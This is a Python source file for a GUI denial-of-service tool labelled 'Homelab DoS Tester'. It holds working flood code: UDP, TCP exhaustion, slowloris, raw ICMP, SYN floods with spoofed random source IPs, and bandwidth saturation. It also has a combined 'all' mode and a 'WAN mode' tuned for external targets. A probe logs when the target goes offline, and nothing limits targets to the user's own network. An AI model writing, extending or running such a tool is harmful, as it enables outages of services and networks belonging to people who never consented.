#!/usr/bin/env python3
# homelab_dos_gui.py — Homelab DoS Tester GUI  v2
# pip install customtkinter
# Build: pyinstaller --onefile --windowed --collect-all customtkinter -n "HomelabDosTester" homelab_dos_gui.py
# icmp / syn / all require running as Administrator

import customtkinter as ctk
import threading, queue, time, os, random, socket, struct, subprocess
import urllib.request
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime

ctk.set_appearance_mode("dark")

# ── palette ───────────────────────────────────────────────────
BG    = "#080808"
SURF  = "#101010"
CARD  = "#161616"
LINE  = "#222222"
FG    = "#dcdcdc"
DIM   = "#484848"
RED   = "#c02020"
RED_H = "#d93030"
GRN   = "#229040"
AMB   = "#c08818"
MONO  = "Consolas"

METHODS_ALL = ["udp", "tcp", "slowloris", "icmp", "syn", "bandwidth", "all"]
METHODS_WAN = ["udp", "tcp", "bandwidth", "all"]
WAN_INCOMPAT = {"icmp", "syn", "slowloris"}

METHOD_HELP = {
    "udp":       "UDP packet flood to target port",
    "tcp":       "TCP connection exhaustion",
    "slowloris": "HTTP slow-header hold  (port 80/443)",
    "icmp":      "ICMP echo flood  ★ admin required",
    "syn":       "SYN flood w/ optional IP spoof  ★ admin",
    "bandwidth": "Max-size UDP for bandwidth saturation",
    "all":       "All methods simultaneously  ★ admin recommended",
}


# ── stats ─────────────────────────────────────────────────────

class Stats:
    def __init__(self):
        self.packets = self.bytes_ = self.errors = 0
        self._lk = threading.Lock()
        self.t0  = time.monotonic()

    def reset(self):
        with self._lk:
            self.packets = self.bytes_ = self.errors = 0
            self.t0 = time.monotonic()

    def rec(self, p=1, b=0):
        with self._lk:
            self.packets += p; self.bytes_ += b

    def err(self):
        with self._lk:
            self.errors += 1

    def snap(self):
        with self._lk:
            e = max(time.monotonic() - self.t0, 1e-3)
            return dict(
                packets=self.packets, mb=self.bytes_/1e6,
                pps=self.packets/e, mbps=self.bytes_*8/e/1e6,
                errors=self.errors, elapsed=e,
            )


# ── raw packet helpers ────────────────────────────────────────

def _cs(d: bytes) -> int:
    if len(d) % 2: d += b'\x00'
    s = sum(struct.unpack_from('!H', d, i)[0] for i in range(0, len(d), 2))
    while s >> 16: s = (s & 0xFFFF) + (s >> 16)
    return ~s & 0xFFFF


# ── attack workers (throttle=[float] slows burst ramp) ────────

def _udp_w(ip, port, size, ev, st, throttle):
    pl = random.randbytes(size)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        while not ev.is_set():
            t = throttle[0]
            if t > 0: time.sleep(t * 0.05)
            try: st.rec(1, s.sendto(pl, (ip, port)))
            except OSError: st.err()

def run_udp(ip, port, size, n, ev, st, log, throttle=None):
    th = throttle or [0.0]
    log(f"udp  →  {ip}:{port}   size={size}b   threads={n}")
    for _ in range(n):
        threading.Thread(target=_udp_w, args=(ip, port, size, ev, st, th), daemon=True).start()
    ev.wait()


def _tcp_w(ip, port, hold, ev, st, throttle):
    while not ev.is_set():
        t = throttle[0]
        if t > 0: time.sleep(t * 0.1)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            s.settimeout(2); s.connect((ip, port)); st.rec(1, 0)
            if hold > 0: time.sleep(hold / 1000)
        except OSError: st.err()
        finally:
            try: s.close()
            except: pass

def run_tcp(ip, port, n, hold, ev, st, log, throttle=None):
    th = throttle or [0.0]
    log(f"tcp  →  {ip}:{port}   threads={n}   hold={hold}ms")
    with ThreadPoolExecutor(max_workers=n) as ex:
        for _ in range(n): ex.submit(_tcp_w, ip, port, hold, ev, st, th)
        ev.wait()


def _sl_open(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4); s.connect((ip, port))
    s.send(f"GET /?{random.randint(0,9999)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: Mozilla/5.0\r\n".encode())
    return s

def run_slowloris(ip, port, n_sockets, ev, st, log, throttle=None):
    log(f"slowloris  →  {ip}:{port}   sockets={n_sockets}")
    socks = []
    for _ in range(n_sockets):
        if ev.is_set(): break
        try: socks.append(_sl_open(ip, port)); st.rec(1, 0)
        except OSError: st.err()
    while not ev.is_set():
        alive = []
        for s in socks:
            try:
                s.send(f"X-a: {random.randint(1,9999)}\r\n".encode())
                alive.append(s); st.rec(1, 0)
            except:
                st.err()
                try: alive.append(_sl_open(ip, port))
                except: pass
        socks = alive
        ev.wait(timeout=15)
    for s in socks:
        try: s.close()
        except: pass


def run_icmp(ip, size, n, ev, st, log, throttle=None):
    th = throttle or [0.0]
    def w():
        try: s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        except PermissionError: log("✗ icmp requires Administrator"); ev.set(); return
        seq = 0
        while not ev.is_set():
            t = th[0]
            if t > 0: time.sleep(t * 0.05)
            try:
                d = random.randbytes(size); pid = os.getpid() & 0xFFFF
                h = struct.pack('!BBHHH', 8, 0, 0, pid, seq % 65535)
                h = struct.pack('!BBHHH', 8, 0, _cs(h+d), pid, seq % 65535)
                st.rec(1, s.sendto(h+d, (ip, 0))); seq += 1
            except OSError: st.err()
        s.close()
    log(f"icmp  →  {ip}   size={size}b   threads={n}")
    for _ in range(n):
        threading.Thread(target=w, daemon=True).start()
    ev.wait()


def _syn_pkt(src, dst, sp, dp):
    si, di = socket.inet_aton(src), socket.inet_aton(dst)
    ih = struct.pack('!BBHHHBBH4s4s', (4<<4)|5,0,40,random.randint(0,65535),0,64,socket.IPPROTO_TCP,0,si,di)
    ih = struct.pack('!BBHHHBBH4s4s', (4<<4)|5,0,40,random.randint(0,65535),0,64,socket.IPPROTO_TCP,_cs(ih),si,di)
    th = struct.pack('!HHLLBBHHH', sp,dp,random.randint(0,0xFFFFFFFF),0,(5<<4),0x02,65535,0,0)
    ph = struct.pack('!4s4sBBH', si,di,0,socket.IPPROTO_TCP,len(th))
    th = struct.pack('!HHLLBBHHH', sp,dp,random.randint(0,0xFFFFFFFF),0,(5<<4),0x02,65535,_cs(ph+th),0)
    return ih+th

def run_syn(ip, port, spoof, n, ev, st, log, throttle=None):
    th = throttle or [0.0]
    def w():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        except PermissionError: log("✗ syn requires Administrator"); ev.set(); return
        loc = socket.gethostbyname(socket.gethostname())
        while not ev.is_set():
            t = th[0]
            if t > 0: time.sleep(t * 0.05)
            try:
                src = (f"{random.randint(1,254)}.{random.randint(0,254)}"
                       f".{random.randint(0,254)}.{random.randint(1,254)}" if spoof else loc)
                st.rec(1, s.sendto(_syn_pkt(src,ip,random.randint(1024,65535),port),(ip,0)))
            except OSError: st.err()
        s.close()
    log(f"syn  →  {ip}:{port}   spoof={spoof}   threads={n}")
    for _ in range(n):
        threading.Thread(target=w, daemon=True).start()
    ev.wait()


def _bw_w(ip, port, ev, st, throttle):
    pl = random.randbytes(65507)
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)
        while not ev.is_set():
            t = throttle[0]
            if t > 0: time.sleep(t * 0.05)
            try: st.rec(1, s.sendto(pl, (ip, port)))
            except OSError: st.err()

def run_bandwidth(ip, port, n, ev, st, log, throttle=None):
    th = throttle or [0.0]
    log(f"bandwidth  →  {ip}:{port}   threads={n}")
    for _ in range(n):
        threading.Thread(target=_bw_w, args=(ip, port, ev, st, th), daemon=True).start()
    ev.wait()


def run_all(ip, port, n, size, nsocks, hold, spoof, ev, st, log, throttle=None):
    th = throttle or [0.0]
    log("launching all methods simultaneously...")
    specs = [
        (run_udp,       (ip, port, size, n, ev, st, log, th)),
        (run_tcp,       (ip, port, n, hold, ev, st, log, th)),
        (run_slowloris, (ip, port, nsocks, ev, st, log, th)),
        (run_icmp,      (ip, size, max(1,n//4), ev, st, log, th)),
        (run_syn,       (ip, port, spoof, max(1,n//4), ev, st, log, th)),
        (run_bandwidth, (ip, port, n, ev, st, log, th)),
    ]
    for fn, args in specs:
        threading.Thread(target=fn, args=args, daemon=True).start()
    ev.wait()


# ── GUI ───────────────────────────────────────────────────────

class App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Homelab DoS Tester")
        self.geometry("860x660")
        self.minsize(800, 600)
        self.configure(fg_color=BG)
        self.resizable(True, True)

        self._stats     = Stats()
        self._stop_ev   = threading.Event()
        self._probe_ev  = threading.Event()
        self._running   = False
        self._probing   = False
        self._log_q     = queue.Queue()
        self._throttle  = [0.0]

        self._build_header()
        self._build_body()
        self._build_footer()

        self._poll_stats()
        self._poll_log()

        self._log("ready — configure target and press LAUNCH")

    # ── header ────────────────────────────────────────────────

    def _build_header(self):
        hdr = ctk.CTkFrame(self, fg_color=SURF, corner_radius=0, height=46)
        hdr.pack(fill="x", side="top")
        hdr.pack_propagate(False)

        ctk.CTkLabel(hdr, text="HOMELAB DOS TESTER",
                     font=ctk.CTkFont(MONO, 13, "bold"), text_color=FG,
                     ).pack(side="left", padx=18)

        self._status_dot = ctk.CTkLabel(hdr, text="●  IDLE",
                                        font=ctk.CTkFont(MONO, 11), text_color=DIM)
        self._status_dot.pack(side="right", padx=18)

        ctk.CTkFrame(self, fg_color=LINE, height=1, corner_radius=0).pack(fill="x")

    # ── body ──────────────────────────────────────────────────

    def _build_body(self):
        body = ctk.CTkFrame(self, fg_color=BG, corner_radius=0)
        body.pack(fill="both", expand=True)
        body.columnconfigure(1, weight=1)
        body.rowconfigure(0, weight=1)

        self._build_left(body)
        ctk.CTkFrame(body, fg_color=LINE, width=1, corner_radius=0).grid(
            row=0, column=0, sticky="ns", padx=(230, 0))
        self._build_right(body)

    # ── left panel ────────────────────────────────────────────

    def _build_left(self, parent):
        left = ctk.CTkScrollableFrame(
            parent, fg_color=SURF, width=230, corner_radius=0,
            scrollbar_button_color=LINE, scrollbar_button_hover_color=DIM,
        )
        left.grid(row=0, column=0, sticky="nsew")

        def section(label):
            ctk.CTkLabel(left, text=label,
                         font=ctk.CTkFont(MONO, 9, "bold"),
                         text_color=DIM, anchor="w",
                         ).pack(fill="x", padx=14, pady=(14, 2))

        def lbl(text):
            ctk.CTkLabel(left, text=text,
                         font=ctk.CTkFont(MONO, 10),
                         text_color=FG, anchor="w").pack(fill="x", padx=14, pady=(4, 0))

        def entry(default):
            e = ctk.CTkEntry(left, height=28, fg_color=CARD,
                             border_color=LINE, border_width=1,
                             text_color=FG, font=ctk.CTkFont(MONO, 11))
            if default is not None:
                e.insert(0, str(default))
            e.pack(fill="x", padx=14, pady=(2, 0))
            return e

        # ── TARGET ────────────────────────────────────────────
        section("TARGET")
        lbl("IP address")

        ip_row = ctk.CTkFrame(left, fg_color="transparent")
        ip_row.pack(fill="x", padx=14, pady=(2, 0))
        self._ip_entry = ctk.CTkEntry(
            ip_row, height=28, fg_color=CARD,
            border_color=LINE, border_width=1,
            text_color=FG, font=ctk.CTkFont(MONO, 11),
        )
        self._ip_entry.insert(0, "")
        self._ip_entry.pack(side="left", fill="x", expand=True)
        ctk.CTkButton(
            ip_row, text="↺", width=32, height=28,
            fg_color=CARD, hover_color=LINE, text_color=DIM,
            font=ctk.CTkFont(MONO, 13), corner_radius=4,
            border_color=LINE, border_width=1,
            command=self._fetch_ip,
        ).pack(side="left", padx=(4, 0))

        # probe row
        probe_row = ctk.CTkFrame(left, fg_color="transparent")
        probe_row.pack(fill="x", padx=14, pady=(4, 0))
        self._probe_lbl = ctk.CTkLabel(
            probe_row, text="● --",
            font=ctk.CTkFont(MONO, 10), text_color=DIM, width=60, anchor="w",
        )
        self._probe_lbl.pack(side="left")
        self._probe_btn = ctk.CTkButton(
            probe_row, text="Probe",
            width=60, height=22,
            fg_color=CARD, hover_color=LINE, text_color=DIM,
            font=ctk.CTkFont(MONO, 9), corner_radius=3,
            border_color=LINE, border_width=1,
            command=self._toggle_probe,
        )
        self._probe_btn.pack(side="right")

        self._port_entry = entry(80)
        ctk.CTkLabel(left, text="Port", font=ctk.CTkFont(MONO, 10),
                     text_color=FG, anchor="w").pack(fill="x", padx=14, pady=(4, 0))
        self._port_entry = ctk.CTkEntry(
            left, height=28, fg_color=CARD,
            border_color=LINE, border_width=1,
            text_color=FG, font=ctk.CTkFont(MONO, 11))
        self._port_entry.insert(0, "80")
        self._port_entry.pack(fill="x", padx=14, pady=(2, 0))

        # WAN mode switch
        wan_row = ctk.CTkFrame(left, fg_color="transparent")
        wan_row.pack(fill="x", padx=14, pady=(10, 0))
        ctk.CTkLabel(wan_row, text="WAN Mode",
                     font=ctk.CTkFont(MONO, 10), text_color=FG).pack(side="left")
        self._wan_var = ctk.BooleanVar(value=False)
        self._wan_switch = ctk.CTkSwitch(
            wan_row, text="", variable=self._wan_var,
            width=40, height=20,
            fg_color=LINE, progress_color=AMB,
            button_color=FG, button_hover_color=FG,
            command=self._toggle_wan,
        )
        self._wan_switch.pack(side="right")
        self._wan_note = ctk.CTkLabel(
            left, text="optimises for external targets",
            font=ctk.CTkFont(MONO, 9), text_color=DIM, anchor="w",
        )
        self._wan_note.pack(fill="x", padx=14, pady=(1, 0))

        # ── METHOD ────────────────────────────────────────────
        section("METHOD")
        self._method_var = ctk.StringVar(value="udp")
        self._method_menu = ctk.CTkOptionMenu(
            left, variable=self._method_var, values=METHODS_ALL,
            fg_color=CARD, button_color=LINE, button_hover_color=DIM,
            dropdown_fg_color=CARD, dropdown_hover_color=LINE,
            text_color=FG, font=ctk.CTkFont(MONO, 11),
            command=self._on_method_change,
        )
        self._method_menu.pack(fill="x", padx=14, pady=(4, 0))
        self._method_hint = ctk.CTkLabel(
            left, text=METHOD_HELP["udp"],
            font=ctk.CTkFont(MONO, 9), text_color=DIM,
            anchor="w", wraplength=198,
        )
        self._method_hint.pack(fill="x", padx=14, pady=(3, 0))
        self._wan_warn = ctk.CTkLabel(
            left, text="⚠ filtered by most ISPs over WAN",
            font=ctk.CTkFont(MONO, 9), text_color=AMB,
            anchor="w", wraplength=198,
        )
        # not packed yet — shown only when needed

        # ── SETTINGS ──────────────────────────────────────────
        section("SETTINGS")

        lbl("Threads")
        thr_row = ctk.CTkFrame(left, fg_color="transparent")
        thr_row.pack(fill="x", padx=14)
        self._thr_label = ctk.CTkLabel(thr_row, text="100",
                                       font=ctk.CTkFont(MONO, 11), text_color=FG, width=36)
        self._thr_label.pack(side="right")
        self._thr_slider = ctk.CTkSlider(
            thr_row, from_=1, to=500, number_of_steps=499,
            fg_color=LINE, progress_color=RED, button_color=RED,
            button_hover_color=RED_H, command=self._on_thr_slide,
        )
        self._thr_slider.set(100)
        self._thr_slider.pack(side="left", fill="x", expand=True)

        lbl("Packet size (bytes)"); self._size_entry   = entry(1024)
        lbl("Duration (s)  0=∞");  self._duration_entry = entry(0)

        # ── ADVANCED ──────────────────────────────────────────
        section("ADVANCED")
        lbl("Sockets  (slowloris)"); self._sockets_entry = entry(500)
        lbl("Hold ms  (tcp)");       self._hold_entry    = entry(0)

        self._burst_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(
            left, text="Burst mode  (ramp intensity)",
            variable=self._burst_var,
            font=ctk.CTkFont(MONO, 10), text_color=FG,
            fg_color=AMB, hover_color=AMB,
            border_color=LINE, checkmark_color=BG,
        ).pack(anchor="w", padx=14, pady=(8, 2))

        self._spoof_var = ctk.BooleanVar(value=False)
        ctk.CTkCheckBox(
            left, text="Spoof source IPs  (syn)",
            variable=self._spoof_var,
            font=ctk.CTkFont(MONO, 10), text_color=FG,
            fg_color=RED, hover_color=RED_H,
            border_color=LINE, checkmark_color=FG,
        ).pack(anchor="w", padx=14, pady=(4, 8))

    # ── right panel ───────────────────────────────────────────

    def _build_right(self, parent):
        right = ctk.CTkFrame(parent, fg_color=BG, corner_radius=0)
        right.grid(row=0, column=1, sticky="nsew", padx=(1, 0))
        right.rowconfigure(1, weight=1)
        right.columnconfigure(0, weight=1)

        stats_frame = ctk.CTkFrame(right, fg_color=BG, corner_radius=0)
        stats_frame.grid(row=0, column=0, sticky="ew", padx=16, pady=(14, 0))
        stats_frame.columnconfigure((0,1,2), weight=1)

        def stat_card(col, title, var):
            c = ctk.CTkFrame(stats_frame, fg_color=CARD, corner_radius=6)
            c.grid(row=0, column=col, padx=(0 if col==0 else 6, 0), sticky="ew")
            ctk.CTkLabel(c, textvariable=var,
                         font=ctk.CTkFont(MONO, 26, "bold"), text_color=FG,
                         ).pack(pady=(10, 0), padx=12)
            ctk.CTkLabel(c, text=title,
                         font=ctk.CTkFont(MONO, 9, "bold"), text_color=DIM,
                         ).pack(pady=(0, 10), padx=12)

        self._pps_var  = ctk.StringVar(value="0")
        self._mbps_var = ctk.StringVar(value="0.00")
        self._pkts_var = ctk.StringVar(value="0")
        stat_card(0, "PPS",          self._pps_var)
        stat_card(1, "Mbps",         self._mbps_var)
        stat_card(2, "PACKETS SENT", self._pkts_var)

        sec_row = ctk.CTkFrame(right, fg_color=BG, corner_radius=0)
        sec_row.grid(row=0, column=0, sticky="sew", padx=16, pady=(0, 6))
        self._sec_label = ctk.CTkLabel(
            sec_row, text="0.0 MB  ·  0s  ·  0 errors",
            font=ctk.CTkFont(MONO, 9), text_color=DIM, anchor="w",
        )
        self._sec_label.pack(side="left")
        self._burst_label = ctk.CTkLabel(
            sec_row, text="",
            font=ctk.CTkFont(MONO, 9), text_color=AMB, anchor="e",
        )
        self._burst_label.pack(side="right")

        ctk.CTkFrame(right, fg_color=LINE, height=1, corner_radius=0).grid(
            row=0, column=0, sticky="sew", padx=16)

        log_frame = ctk.CTkFrame(right, fg_color=BG, corner_radius=0)
        log_frame.grid(row=1, column=0, sticky="nsew", padx=16, pady=(8, 8))
        log_frame.rowconfigure(1, weight=1)
        log_frame.columnconfigure(0, weight=1)

        ctk.CTkLabel(log_frame, text="LOG",
                     font=ctk.CTkFont(MONO, 9, "bold"),
                     text_color=DIM, anchor="w").grid(row=0, column=0, sticky="w")

        self._log_box = ctk.CTkTextbox(
            log_frame, fg_color=CARD, text_color=FG,
            font=ctk.CTkFont(MONO, 10),
            border_color=LINE, border_width=1,
            corner_radius=4, state="disabled", wrap="none",
        )
        self._log_box.grid(row=1, column=0, sticky="nsew", pady=(4, 0))

    # ── footer ────────────────────────────────────────────────

    def _build_footer(self):
        ctk.CTkFrame(self, fg_color=LINE, height=1, corner_radius=0).pack(fill="x")
        foot = ctk.CTkFrame(self, fg_color=SURF, corner_radius=0, height=56)
        foot.pack(fill="x", side="bottom")
        foot.pack_propagate(False)

        self._stop_btn = ctk.CTkButton(
            foot, text="STOP", width=90, height=34,
            fg_color=CARD, hover_color=LINE, text_color=DIM,
            font=ctk.CTkFont(MONO, 11, "bold"),
            border_color=LINE, border_width=1, corner_radius=4,
            command=self._stop, state="disabled",
        )
        self._stop_btn.pack(side="right", padx=16, pady=11)

        self._launch_btn = ctk.CTkButton(
            foot, text="LAUNCH ATTACK", width=180, height=34,
            fg_color=RED, hover_color=RED_H, text_color="#ffffff",
            font=ctk.CTkFont(MONO, 12, "bold"), corner_radius=4,
            command=self._launch,
        )
        self._launch_btn.pack(side="right", padx=(0, 8), pady=11)

    # ── feature: fetch public IP ──────────────────────────────

    def _fetch_ip(self):
        def fetch():
            try:
                ip = urllib.request.urlopen(
                    'https://api.ipify.org', timeout=5
                ).read().decode().strip()
                def apply():
                    self._ip_entry.delete(0, 'end')
                    self._ip_entry.insert(0, ip)
                    self._log(f"fetched public IP: {ip}  (this machine's WAN address)")
                self.after(0, apply)
            except Exception as e:
                self.after(0, lambda: self._log(f"✗ fetch failed: {e}"))
        threading.Thread(target=fetch, daemon=True).start()

    # ── feature: connectivity probe ───────────────────────────

    def _toggle_probe(self):
        if self._probing:
            self._probe_ev.set()
            self._probing = False
            self._probe_btn.configure(text="Probe", text_color=DIM)
            self._probe_lbl.configure(text="● --", text_color=DIM)
        else:
            ip = self._ip_entry.get().strip()
            if not ip:
                self._log("✗  enter IP before probing"); return
            self._probe_ev.clear()
            self._probing = True
            self._probe_btn.configure(text="Stop", text_color=RED)
            threading.Thread(target=self._probe_loop, args=(ip,), daemon=True).start()

    def _probe_loop(self, ip):
        was_up = None
        while not self._probe_ev.is_set():
            try:
                r = subprocess.run(
                    ['ping', '-n', '1', '-w', '1500', ip],
                    capture_output=True, timeout=4,
                )
                is_up = r.returncode == 0
            except Exception:
                is_up = False

            if is_up != was_up:
                if is_up:
                    self.after(0, lambda: self._probe_lbl.configure(text="● UP", text_color=GRN))
                    if was_up is not None:
                        self._log(f"▲  TARGET BACK ONLINE  —  {ip}")
                else:
                    self.after(0, lambda: self._probe_lbl.configure(text="▼ DOWN", text_color=RED))
                    if was_up is not None:
                        self._log(f"▼  TARGET OFFLINE  —  {ip}")
                was_up = is_up

            self._probe_ev.wait(timeout=3)

        self.after(0, lambda: self._probe_lbl.configure(text="● --", text_color=DIM))

    # ── feature: WAN mode ─────────────────────────────────────

    def _toggle_wan(self):
        wan = self._wan_var.get()
        if wan:
            self._method_menu.configure(values=METHODS_WAN)
            if self._method_var.get() not in METHODS_WAN:
                self._method_var.set("bandwidth")
                self._method_hint.configure(text=METHOD_HELP["bandwidth"])
            self._thr_slider.set(200)
            self._thr_label.configure(text="200")
            self._size_entry.delete(0, 'end')
            self._size_entry.insert(0, "65507")
            self._log("WAN mode ON — methods filtered, defaults tuned for external target")
        else:
            self._method_menu.configure(values=METHODS_ALL)
            self._log("WAN mode OFF")
        self._update_wan_warning()

    def _update_wan_warning(self):
        method = self._method_var.get()
        wan    = self._wan_var.get()
        if wan and method in WAN_INCOMPAT:
            self._wan_warn.pack(fill="x", padx=14, pady=(2, 0))
        else:
            self._wan_warn.pack_forget()

    # ── feature: burst ramp ───────────────────────────────────

    def _burst_ramp(self, ev, ramp_seconds=40):
        start = time.monotonic()
        while not ev.is_set() and self._throttle[0] > 0:
            elapsed = time.monotonic() - start
            self._throttle[0] = max(0.0, 1.0 - elapsed / ramp_seconds)
            pct = int((1.0 - self._throttle[0]) * 100)
            self.after(0, lambda p=pct: self._burst_label.configure(
                text=f"burst ramp  {p}%"))
            time.sleep(0.5)
        self._throttle[0] = 0.0
        self.after(0, lambda: self._burst_label.configure(text="burst  100%"))

    # ── launch / stop ─────────────────────────────────────────

    def _launch(self):
        if self._running: return

        ip   = self._ip_entry.get().strip()
        port = self._port_entry.get().strip()
        if not ip:
            self._log("✗  enter a target IP"); return
        try:
            port = int(port)
        except ValueError:
            self._log("✗  invalid port"); return

        method  = self._method_var.get()
        threads = int(self._thr_slider.get())
        size    = self._safe_int(self._size_entry.get(), 1024)
        dur     = self._safe_int(self._duration_entry.get(), 0)
        nsocks  = self._safe_int(self._sockets_entry.get(), 500)
        hold    = self._safe_int(self._hold_entry.get(), 0)
        spoof   = self._spoof_var.get()
        burst   = self._burst_var.get()

        # set up throttle for burst mode
        if burst:
            self._throttle[0] = 1.0
            self._burst_label.configure(text="burst ramp  0%")
        else:
            self._throttle[0] = 0.0
            self._burst_label.configure(text="")

        self._stats.reset()
        self._stop_ev.clear()
        self._running = True

        self._launch_btn.configure(state="disabled", fg_color=DIM)
        self._stop_btn.configure(state="normal", text_color=FG)
        self._set_status("RUNNING", RED)
        self._log(f"{'─'*52}")
        self._log(f"target  {ip}:{port}   method={method}   threads={threads}"
                  + ("   burst" if burst else ""))

        th = self._throttle
        dispatch = {
            "udp":       lambda: run_udp(ip, port, size, threads, self._stop_ev, self._stats, self._log, th),
            "tcp":       lambda: run_tcp(ip, port, threads, hold, self._stop_ev, self._stats, self._log, th),
            "slowloris": lambda: run_slowloris(ip, port, nsocks, self._stop_ev, self._stats, self._log, th),
            "icmp":      lambda: run_icmp(ip, size, threads, self._stop_ev, self._stats, self._log, th),
            "syn":       lambda: run_syn(ip, port, spoof, threads, self._stop_ev, self._stats, self._log, th),
            "bandwidth": lambda: run_bandwidth(ip, port, threads, self._stop_ev, self._stats, self._log, th),
            "all":       lambda: run_all(ip, port, threads, size, nsocks, hold, spoof,
                                          self._stop_ev, self._stats, self._log, th),
        }

        self._atk_thread = threading.Thread(
            target=self._run_attack, args=(dispatch[method], dur, burst), daemon=True)
        self._atk_thread.start()

        # start probe automatically if not already running
        if not self._probing:
            self._probe_ev.clear()
            self._probing = True
            self._probe_btn.configure(text="Stop", text_color=RED)
            threading.Thread(target=self._probe_loop, args=(ip,), daemon=True).start()

    def _run_attack(self, fn, duration, burst):
        if burst:
            threading.Thread(target=self._burst_ramp,
                             args=(self._stop_ev,), daemon=True).start()
        try:
            if duration > 0:
                threading.Timer(duration, self._stop_ev.set).start()
            fn()
        finally:
            self.after(0, self._on_stopped)

    def _stop(self):
        self._stop_ev.set()
        # also stop probe
        self._probe_ev.set()
        self._probing = False
        self._probe_btn.configure(text="Probe", text_color=DIM)

    def _on_stopped(self):
        self._running = False
        self._launch_btn.configure(state="normal", fg_color=RED)
        self._stop_btn.configure(state="disabled", text_color=DIM)
        self._set_status("IDLE", DIM)
        self._burst_label.configure(text="")
        s = self._stats.snap()
        self._log(f"stopped —  {s['packets']:,} pkts  {s['mb']:.1f} MB  "
                  f"{s['pps']:.0f} pps  {s['mbps']:.2f} Mbps  {s['errors']} err")

    def _on_method_change(self, val):
        self._method_hint.configure(text=METHOD_HELP.get(val, ""))
        self._update_wan_warning()

    def _on_thr_slide(self, val):
        self._thr_label.configure(text=str(int(val)))

    def _set_status(self, text, color):
        self._status_dot.configure(text=f"●  {text}", text_color=color)

    def _safe_int(self, val, default):
        try: return max(0, int(val))
        except: return default

    # ── log ───────────────────────────────────────────────────

    def _log(self, msg):
        self._log_q.put(f"[{datetime.now().strftime('%H:%M:%S')}]  {msg}")

    def _poll_log(self):
        while not self._log_q.empty():
            try: line = self._log_q.get_nowait()
            except queue.Empty: break
            self._log_box.configure(state="normal")
            self._log_box.insert("end", line + "\n")
            self._log_box.see("end")
            self._log_box.configure(state="disabled")
        self.after(120, self._poll_log)

    # ── stats display ─────────────────────────────────────────

    def _poll_stats(self):
        if self._running:
            s = self._stats.snap()
            pps = s['pps']
            if   pps >= 1e6: pps_str = f"{pps/1e6:.1f}M"
            elif pps >= 1e3: pps_str = f"{pps/1e3:.1f}K"
            else:            pps_str = f"{pps:.0f}"

            pkts = s['packets']
            if   pkts >= 1e9: pkts_str = f"{pkts/1e9:.2f}B"
            elif pkts >= 1e6: pkts_str = f"{pkts/1e6:.1f}M"
            elif pkts >= 1e3: pkts_str = f"{pkts/1e3:.1f}K"
            else:             pkts_str = str(pkts)

            self._pps_var.set(pps_str)
            self._mbps_var.set(f"{s['mbps']:.2f}")
            self._pkts_var.set(pkts_str)
            self._sec_label.configure(
                text=f"{s['mb']:.1f} MB  ·  {s['elapsed']:.0f}s  ·  {s['errors']} errors"
            )
        self.after(250, self._poll_stats)


# ── entry ─────────────────────────────────────────────────────

if __name__ == "__main__":
    app = App()
    app.mainloop()
